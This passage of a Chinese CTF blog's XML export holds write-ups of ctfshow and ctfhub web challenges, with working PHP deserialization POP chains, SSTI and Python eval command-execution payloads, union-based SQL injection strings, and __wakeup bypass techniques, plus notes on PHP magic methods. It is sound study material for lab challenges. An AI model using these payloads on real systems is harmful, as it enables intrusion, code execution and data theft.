__get($kk)&#123;</span><br><span class="line">        echo &quot;$kk,eeeeeeeeeeeee&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        $a = new cycycycy;</span><br><span class="line">        $a -&gt; aaa();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cycycycy&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    private $b;</span><br><span class="line"></span><br><span class="line">    public function aaa()&#123;</span><br><span class="line">        $get = $_GET[&#x27;get&#x27;];</span><br><span class="line">        $get = cipher($get);</span><br><span class="line">        if($get === &quot;p8vfuv8g8v8py&quot;)&#123;</span><br><span class="line">            eval($_POST[&quot;eval&quot;]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $a_a = $this -&gt; a;</span><br><span class="line">        echo &quot;\$a_a\$&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class gBoBg&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $file;</span><br><span class="line">    public $coos;</span><br><span class="line">    private $eeee=&quot;-_-&quot;;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(isset($this-&gt;name))&#123;</span><br><span class="line">            $a = new $this-&gt;coos($this-&gt;file);</span><br><span class="line">            echo $a;</span><br><span class="line">        &#125;else if(!isset($this -&gt; file))&#123;</span><br><span class="line">            return $this-&gt;coos-&gt;name;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $aa = $this-&gt;coos;</span><br><span class="line">            $bb = $this-&gt;file;</span><br><span class="line">            return $aa();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line">class w_wuw_w&#123;</span><br><span class="line">    public $aaa;</span><br><span class="line">    public $key;</span><br><span class="line">    public $file;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(!preg_match(&quot;/php|63|\*|\?/i&quot;,$this -&gt; key))&#123;</span><br><span class="line">            $this-&gt;key = file_get_contents($this -&gt; file);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;不行哦&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this -&gt; aaa = clone new EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_ip = $_SERVER[&quot;HTTP_AAAAAA&quot;];</span><br><span class="line">unserialize($_ip);</span><br></pre></td></tr></table></figure>

<p>就四个类，还是很好做的</p>
<p>由于不知道其中cipher()函数的加密方式，所以得先看看包含的check.php内容是什么（byd他说的那个txt根本扫不出来，还是我最后做完才翻的目录是h1nt.txt💧）</p>
<p>在w_wuw_w类中有file_get_contents()函数可以方便的把$file外带出来，但是他只在destruct的时候echo出$aaa，所以就要用到之前狗学长说过的引用&amp;赋值</p>
<p>让$aaa &#x3D; &amp;$file，使得这两个变量指向相同地址，这样两个变量的内容就会同时改变</p>
<p>构造出payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$w_wuw_w = new w_wuw_w();</span><br><span class="line">$w_wuw_w -&gt; key = &#x27;test&#x27;;</span><br><span class="line">$w_wuw_w -&gt; file = &#x27;check.php&#x27;;</span><br><span class="line">$w_wuw_w -&gt; aaa = &amp;$w_wuw_w -&gt; key;</span><br><span class="line">O:7:&quot;w_wuw_w&quot;:4:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;s:4:&quot;test&quot;;s:4:&quot;file&quot;;s:9:&quot;check.php&quot;;s:0:&quot;&quot;;R:3;&#125;</span><br></pre></td></tr></table></figure>

<p>外带出check.php的内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050012246.png" alt="image-20230405001238222"></p>
<p>略加修改一下就得到了具体的内容，分析一下能写出解密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def decrypt_string(input_string):</span><br><span class="line">    charset = &quot;qwertyuiopasdfghjklzxcvbnm123456789&quot;</span><br><span class="line">    shift = 4</span><br><span class="line">    shifted = &quot;&quot;</span><br><span class="line">    for char in input_string:</span><br><span class="line">        pos = charset.find(char)</span><br><span class="line">        if pos != -1:</span><br><span class="line">            new_pos = (pos + shift + len(charset)) % len(charset)</span><br><span class="line">            shifted += charset[new_pos]</span><br><span class="line">        else:</span><br><span class="line">            shifted += char</span><br><span class="line">    return shifted</span><br><span class="line">print(decrypt_string(&#x27;p8vfuv8g8v8py&#x27;))</span><br></pre></td></tr></table></figure>

<p>得到原本get该传入的值：fe1ka1ele1efp</p>
<p>由w_wuw_w的echo函数又可以调用__toString，总结一下得到pop链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w_wuw_w::__destruct() -&gt; gBoBg::__toString() -&gt; w_wuw_w::__invoke() -&gt; EeE::__clone() -&gt; cycycycy::aaa()</span><br><span class="line">O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;file&quot;;s:4:&quot;test&quot;;s:4:&quot;coos&quot;;O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;N;s:3:&quot;key&quot;;s:2:&quot;63&quot;;s:4:&quot;file&quot;;N;&#125;&#125;s:3:&quot;key&quot;;s:2:&quot;63&quot;;s:4:&quot;file&quot;;s:9:&quot;check.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>同时传入?get&#x3D;fe1ka1ele1efp;eval&#x3D;system(‘ls &#x2F;‘);</p>
<p>就可得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050016174.png" alt="image-20230405001615152"></p>
<p>cat一下就行</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050016060.png" alt="image-20230405001637044"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;be571200-b78b-4bfe-ba08-71787e58acb6&#125;</span><br></pre></td></tr></table></figure>

<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=new w_wuw_w();</span><br><span class="line">$b=new gBoBg();</span><br><span class="line">$a-&gt;aaa=$b;</span><br><span class="line">$b-&gt;name=123;</span><br><span class="line">$b-&gt;coos=&quot;SplFileObject&quot;;</span><br><span class="line">$b-&gt;file=&quot;php://filter/convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>加请求头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAAAAA:O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;i:123;s:4:&quot;file&quot;;s:11:&quot;glob:///*f*&quot;;s:4:&quot;coos&quot;;s:17:&quot;DirectoryIterator&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br><span class="line">#得到文件名：f1agaaa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAAAAA:O:7:&quot;w_wuw_w&quot;:3:&#123;s:3:&quot;aaa&quot;;O:5:&quot;gBoBg&quot;:3:&#123;s:4:&quot;name&quot;;i:123;s:4:&quot;file&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=/f1agaaa&quot;;s:4:&quot;coos&quot;;s:13:&quot;SplFileObject&quot;;&#125;s:3:&quot;key&quot;;N;s:4:&quot;file&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>用的是php原生类，glob直接查flag，SplFileObject查flag，太快了</p>
<h3 id="easy-ssti"><a href="#easy-ssti" class="headerlink" title="easy_ssti"></a>easy_ssti</h3><h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><p>提示</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050025322.png" alt="image-20230405002511299"></p>
<p>打开看到是常见的ssti</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050025174.png" alt="image-20230405002546148"></p>
<p>用hackbar的ssti换几个试试，找到app.py的源码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050028102.png" alt="image-20230405002846077"></p>
<p>很明显，要求过滤了f和&#x2F;，但是如果里边有ge就可以正常解析</p>
<p>由于要先出现ge，那就构造shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ge=&quot;test&quot;;cd ..;cat flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304050036618.png" alt="image-20230405003607596"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;1fe332f3-a27d-44f2-b864-2416b80c021e&#125;</span><br></pre></td></tr></table></figure>

<p>其实扫网的时候有console目录，也可以通过ssti得到机器信息算出pin码直接执行python命令，不过更复杂了</p>
<h4 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h4><p>相似，只不过狗学长用的cat命令更巧妙，没有构造ge</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat $&#123;PATH:0:1&#125;[9-q][9-q][9-q][9-q]</span><br></pre></td></tr></table></figure>

<p>用${PATH:0:1}代替&#x2F;，正则[9-q]匹配flag四个字母</p>
<h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><p>官方给的题解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/hello/&#123;&#123; &quot;&quot;.__class__.__base__ .__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](request.args.get(&quot;ctfshow&quot;)).read()&#125;&#125;ge?ctfshow=cat /flag </span><br></pre></td></tr></table></figure>

<h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>打开是个登陆页面，用sqlmap也爆不出来，就尝试直接注册登陆看看内容</p>
<p>登陆进去提示我的角色是user，当角色是admin的时候会给出东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051204342.png" alt="image-20230405120423293"></p>
<p>再看看learn的内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051206785.png" alt="image-20230405120609765"></p>
<p>给出了app.secret_key &#x3D; ‘S3cr3tK3y’，在burp里又能看到cookie内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051206709.png" alt="image-20230405120639690"></p>
<p>base64解码出来就能看到信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051207045.png" alt="image-20230405120713026"></p>
<p>所以就用工具伪造一下session</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051210297.png" alt="image-20230405121020273"></p>
<p>加密后用burp传进去就有任意文件下载的功能</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051211084.png" alt="image-20230405121111065"></p>
<p>看一下app.py是怎么写的</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051216349.png" alt="image-20230405121604328"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051216781.png" alt="image-20230405121621759"></p>
<p>分别给出了admin的密码和一个hello路径，有eval利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).system(&#x27;ls / &gt; test&#x27;)</span><br></pre></td></tr></table></figure>

<p>然后任意文件读取test</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051225286.png" alt="image-20230405122559265"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).system(&#x27;cat /flag_is_h3re &gt; test&#x27;)</span><br></pre></td></tr></table></figure>

<p>或者更直接一点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=__import__(&#x27;os&#x27;).popen(&#x27;cat /*f*&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;d7cbfb77-b2fb-47ee-ade9-e78bd40c9871&#125;</span><br></pre></td></tr></table></figure>

<h2 id="easy-base"><a href="#easy-base" class="headerlink" title="easy_base"></a>easy_base</h2><p>一把梭脚本</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304051240312.png" alt="image-20230405124031283"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;yu_ren_j1e_haPpy!!!&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>web</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Cookie注入</title>
    <url>/2023/03/26/Cookie%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>提示是cookie注入，随便发点cookie过去</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262211721.png" alt="image-202303262211721"></p>
<p>那就发cookie id过去</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262214650.png" alt="image-20230326221312259"></p>
<p>显然是普通的数字注入，order by尝试之后有两列</p>
<p>那就用一般的联合注入union select</p>
<p>构造id&#x3D;-1 union select 1,code查找</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262216303.png" alt="image-20230326221603268"></p>
<p>已经成功注入了，看得出来数据库是sqli</p>
<p>爆库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262217257.png" alt="image-20230326221717225"></p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262217179.png" alt="image-20230326221754150"></p>
<p>爆字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;gpdznzrugt&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262218763.png" alt="image-20230326221827733"></p>
<p>爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,rgbrnkhfep from sqli.gpdznzrugt</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262219457.png" alt="image-20230326221914424"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>php魔术方法</title>
    <url>/2023/04/08/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h2 id="关于php的反序列化"><a href="#关于php的反序列化" class="headerlink" title="关于php的反序列化"></a>关于php的反序列化</h2><p>题里主要就是各种利用魔术方法进行跳转，从而实现恶意代码。</p>
<p>要利用这些魔术方法，就不得不了解一下有什么和如何利用</p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>构造函数，只有在new一个对象的时候会触发，这时候会执行__construct()下的语句</p>
<p>需要注意的是，在序列化和反序列化中都不会触发该方法</p>
<h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>析构函数会在对象被销毁的时候被调用，典型的就是die和unset函数，寒假考核的时候就用到了这个点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class web</span><br><span class="line">&#123;</span><br><span class="line">    public function __wakeup() </span><br><span class="line">    &#123;</span><br><span class="line">        die(&quot;不许反序列化哦&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class pwn</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;r1 . &#x27;  --0xfa&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当整个过程被die销毁之后，自然会触发pwn的__destruct函数，前提是序列化的时候包含了pwn</p>
<p>同时，反序列化结束回收的时候也会调用</p>
<h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p>当调用一个<strong>不存在的方法</strong>时会触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public function __call($name,$arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $name.&#x27;--&#x27;.$arguments[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$a -&gt; fun(&#x27;test&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>调用了一个不存在的方法fun()，向fun()中传入了参数test，所以会把这个不存在的函数名存入__call里的$name变量，参数test存入$arguments中。这个$arguments是数组变量。</p>
<p>得到结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304081527924.png" alt="image-20230408152719876"></p>
<h3 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h3><p>当调用一个<strong>不存在的变量</strong>时会触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$a -&gt; test;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>同样的，当调用这个不存在的变量test时，会自动执行__get命令，并把变量名传入$name中</p>
<h3 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h3><p>给不存在的变量<strong>赋值</strong>的时候会自动触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public function __get($nam)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;get:&#x27;.$name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($name,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;set:&#x27;.$name.$value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$a -&gt; test = &#x27;test&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这时候就只会调用__set方法，而__get方法不调用了</p>
<h3 id="isset"><a href="#isset" class="headerlink" title="__isset"></a>__isset</h3><p>对不可访问的属性调用isset()或者empty()的时候触发</p>
<p>不可访问的属性包括：私有属性，不存在的属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    protected $pro;</span><br><span class="line">    private $pri;</span><br><span class="line">    public function __isset($name)</span><br><span class="line">    &#123;</span><br><span class="line">        echo $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data=unserialize($_POST[&#x27;data&#x27;]);</span><br><span class="line">isset($data-&gt;pro);</span><br><span class="line">empty($data-&gt;pri);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>在hackbar中传入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data=O:1:&quot;A&quot;:2:&#123;s:6:&quot;%00*%00pro&quot;;N;s:6:&quot;%00A%00pri&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>则会echo出pro和pri</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304081607014.png" alt="image-20230408160715995"></p>
<h3 id="unset"><a href="#unset" class="headerlink" title="__unset"></a>__unset</h3><p>同理，当用unset销毁不可访问的成员属性的时候就会触发该变量</p>
<h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h3><p>在把对象serialize()的时候触发</p>
<h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>在进行反序列化的时候，会先检查是否存在__wakeup方法，如果存在则调用，再进行反序列化</p>
<p>一般来说，在做题的时候，wakeup一般都是入点，即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unserialize()-&gt;A::__wakeup()</span><br></pre></td></tr></table></figure>

<p>此外，还需要学会绕过wakeup</p>
<h4 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h4><p>最常见的一个绕过方法，即修改对象个数值</p>
<p>正常的值如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;</span><br></pre></td></tr></table></figure>

<p>如果A中存在wakeup要绕过，仅需把”A”:1改为”A”:2即可绕过</p>
<h4 id="C绕过"><a href="#C绕过" class="headerlink" title="C绕过"></a>C绕过</h4><p>把反序列化后的开头O换成C也可绕过wakeup，不过这样只能执行construct()函数或者destruct()函数，无法添加任何内容</p>
<p>但在ctfshow愚人杯还有种新方法可以绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">    	echo &#x27;pass&#x27;;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = $_GET[&#x27;1+1&gt;2&#x27;];</span><br><span class="line"></span><br><span class="line">if(!preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $data))&#123;</span><br><span class="line">    unserialize($data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfshow&#123;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">    	echo &#x27;pass&#x27;;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">$a=new ctfshow();</span><br><span class="line">echo serialize($a);</span><br><span class="line">#O:7:&quot;ctfshow&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>当把O改C传C:7:”ctfshow”:0:{}进去可显示pass，但是也就只能这么传入了，改了东西就没反应</p>
<p>可以用ArrayObject对正常的反序列化内容包装一次，让最后输出的payload以C开头</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshow &#123;</span><br><span class="line">    public $ctfshow;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;OK&quot;;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=new ctfshow;</span><br><span class="line">$a-&gt;ctfshow=&quot;whoami&quot;;</span><br><span class="line">$arr=array(&quot;evil&quot;=&gt;$a);</span><br><span class="line">$oa=new ArrayObject($arr);</span><br><span class="line">$res=serialize($oa);</span><br><span class="line">echo $res;</span><br><span class="line">//unserialize($res)</span><br><span class="line">?&gt;</span><br><span class="line">#C:11:&quot;ArrayObject&quot;:77:&#123;x:i:0;a:1:&#123;s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这就成功执行了</p>
<p>以上内容照抄狗学长博客：<a href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">PHP反序列化中wakeup()绕过总结 – fushulingのblog</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304081633450.png" alt="image-20230408163355422"></p>
<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h3><p>当这个对象被当做字符串处理的时候，就会触发</p>
<p>常见的当做字符串处理有：</p>
<p>echo()输出，.拼接，preg_match()比较，substr()截取，strcmp()比较等</p>
<h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h3><p>当对象被当成函数调用时触发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;invoke&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;a)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new A();</span><br><span class="line">$b = new A();</span><br><span class="line">$a -&gt; a = $b;</span><br><span class="line">$a -&gt; invoke();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>此时，A类中的$a是一个A类，而在involve()函数中把$a当函数执行，即把A类当成一个函数调用，自然就进入了__invoke()中</p>
<h2 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h2><p>当clone一个类时调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class w_wuw_w</span><br><span class="line">&#123;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this -&gt; aaa = clone new EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class EeE</span><br><span class="line">&#123;</span><br><span class="line">    public function __clone()&#123;</span><br><span class="line">        $a = new cycycycy;</span><br><span class="line">        $a -&gt; aaa();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当进入w_wuw_w类中的__invoke()时，会clone一个EeE，此时则会进入EeE中的__clone()</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
</search>
